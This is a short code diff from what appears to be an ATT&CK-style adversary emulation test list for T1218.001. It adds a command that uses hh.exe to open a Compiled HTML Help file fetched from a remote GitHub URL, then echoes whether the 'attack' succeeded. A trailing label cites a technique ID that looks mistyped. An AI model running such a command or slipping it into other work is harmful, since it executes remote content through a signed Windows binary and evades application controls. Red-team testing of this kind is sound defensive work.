@@ -1,7 +1,5 @@
 '''
-:: T1218.001 Signed Binary Proxy Execution: Compiled HTML Test 2 - Compiled HTML Help Remote Payload
-:: Remote directory https://raw.githubusercontent.com/jsprat000/bin/main/
-hh.exe https://raw.githubusercontent.com/jsprat000/bin/main/T1218.001.chm
+hh.exe https://raw.githubusercontent.com/jsprat000/bin/main/T1218.001.chm && (Echo Success Attack: T1218.001 - Compiled HTML File - Test 2 - Compiled HTML Help Remote Payload) || (Echo Fail Attack: T1218.001 - Compiled HTML File - Test 2 - Compiled HTML Help Remote Payload)
 '''
 
 T2078.003 Test 1
